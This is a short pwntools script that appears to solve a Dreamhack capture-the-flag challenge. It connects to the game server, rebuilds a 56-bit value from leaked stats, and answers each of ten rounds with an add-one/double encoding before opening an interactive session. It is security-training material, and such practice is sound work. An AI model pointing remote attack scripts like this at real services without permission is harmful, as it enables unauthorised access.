from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 11545
r = remote(HOST, PORT)

for i in range(10):
    r.recvuntil(b'[INFO]')
    stats=r.recvline().decode().strip('\n').split(',')
    stats=[int(x.split(' ')[-1]) for x in stats]
    ptr=0
    ptr |= stats[0] << 48
    ptr |= stats[1]
    ptr |= stats[2] << 8
    ptr |= stats[3] << 16
    ptr |= stats[4] << 24
    ptr |= stats[5] << 32
    ptr |= stats[6] << 40

    payload=[]
    while ptr != 0:
        if ptr % 2 == 0:
            ptr //= 2
            payload.append(b'B')

        else:
            ptr -= 1
            payload.append(b'A')
    total=0
    for x in payload[::-1]:
        if x == b'A':
            total += 1
        else:
            total *= 2
    r.sendlineafter(b'!: ', b''.join(payload[::-1]))

r.interactive()